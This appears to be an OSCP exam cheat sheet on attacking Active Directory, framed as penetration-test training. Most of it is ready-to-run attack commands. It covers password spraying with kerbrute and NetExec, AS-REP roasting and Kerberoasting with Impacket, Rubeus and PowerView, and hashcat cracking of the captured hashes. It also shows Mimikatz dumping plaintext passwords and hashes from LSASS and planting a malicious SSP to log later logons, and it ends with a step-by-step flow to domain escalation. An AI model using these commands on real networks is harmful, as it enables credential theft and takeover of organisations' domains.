# Attacking Active Directory (OSCP)

> Goal: Exploit Active Directory authentication and delegation weaknesses to obtain credentials, hashes, or tickets for privilege escalation and lateral movement.  
> Scope: Anonymous → Authenticated → Post-Exploitation

---

## 1. Password Spraying (Anonymous)

**Description:**  
Password spraying tests a *single common password* against many domain users to avoid account lockouts. Effective when password policies are weak or predictable.

### Kerbrute
```bash
./kerbrute_linux_amd64 passwordspray \
-d corp.com \
--dc dc1.corp.com \
users.txt 'Nexus123!'
```

### NetExec (NXC)
```bash
nxc smb <DC-IP> -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

Success indicates:
- Valid credentials
- Immediate access to authenticated enumeration

---

## 2. AS-REP Roasting (Anonymous)

**Description:**  
Targets users with **Kerberos pre-authentication disabled**. The KDC returns an encrypted blob that can be cracked offline without valid credentials.

### Impacket
```bash
impacket-GetNPUsers corp.com/ \
-no-pass \
-usersfile users.txt
```

### NetExec (NXC)
```bash
nxc ldap <DC-IP> -u users.txt -p '' -d corp.com --asreproast output.txt
```

Crack output with:
```bash
hashcat -m 18200 output.txt wordlist.txt
```

---

## 3. Password Spraying (Authenticated)

**Description:**  
Once a single domain account is compromised, authenticated spraying can validate additional users more reliably and enumerate password policy details.

### Method
- Build a clean user list
- Spray using SMB / LDAP
- Reuse anonymous spraying techniques with credentials

---

## 4. AS-REP Roasting (Authenticated)

**Description:**  
Authenticated context allows more reliable discovery of AS-REP roastable accounts and higher success rates.

### Rubeus
```powershell
Rubeus.exe asreproast
```

### NetExec (NXC)
```bash
nxc ldap <DC-IP> -u users.txt -p '' -d corp.com --asreproast output.txt
```

---

## 5. Kerberoasting

**Description:**  
Kerberoasting targets **service accounts with SPNs**. Service tickets are encrypted with the service account password hash and can be cracked offline.

### PowerView
```powershell
Get-DomainUser -SPN | Get-DomainSPNTicket
```

### Rubeus
```powershell
Rubeus.exe kerberoast
```

### NetExec (NXC)
```bash
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```

### Impacket
```bash
impacket-GetUserSPNs corp.com/dave:Flowers1 -request
```

Crack with:
```bash
hashcat -m 13100 kerberoast.txt wordlist.txt
```

---

## 6. Credential Dumping (Post-Exploitation)

### Mimikatz (Elevated Context Required)

**Description:**  
Mimikatz extracts plaintext credentials, hashes, and Kerberos tickets directly from LSASS memory. Requires local admin or SYSTEM.

---

### Dump Cached Credentials
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

Returns:
- Plaintext passwords
- NTLM hashes
- Kerberos tickets

---

### Intercept Credentials via SSP

**Description:**  
Installs a malicious SSP to log credentials of users who authenticate after injection.

```powershell
mimikatz.exe "privilege::debug" "misc::memssp" "exit"
```

Captured credentials stored in:
```
C:\Windows\System32\mimilsa.log
```

---

## OSCP Attack Flow Summary

1. Password spray anonymously  
2. AS-REP roast discovered users  
3. Gain first credentials  
4. Kerberoast service accounts  
5. Crack offline  
6. Dump creds with Mimikatz  
7. Lateral movement & domain escalation

---

## Exam Tips

- Always spray **one password at a time**
- AS-REP roasting is silent and fast
- Kerberoasting is almost always present
- Mimikatz = game over if DA is logged in
